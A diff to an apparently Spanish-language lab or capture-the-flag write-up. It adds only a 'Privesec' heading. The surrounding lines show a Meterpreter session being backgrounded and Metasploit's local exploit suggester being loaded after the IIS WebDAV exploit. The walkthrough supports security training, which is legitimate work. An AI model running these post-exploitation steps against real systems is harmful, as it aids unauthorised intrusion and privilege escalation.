@@ -218,6 +218,9 @@ Enviamos la sesión a background, para ejecutar el exploit de escalamiento de pr
   meterpreter > background 
   [*] Backgrounding session 1...
 ```
+
+#### Privesec
+
 Procedemos a utilizar “Metasploit Local Exploit Suggester”, el cual, verificará y entregará vulnerabilidades locales que podemos explotar desde la sesión obtenida anteriormente.
 ```Python
   msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > use post/multi/recon/local_exploit_suggester
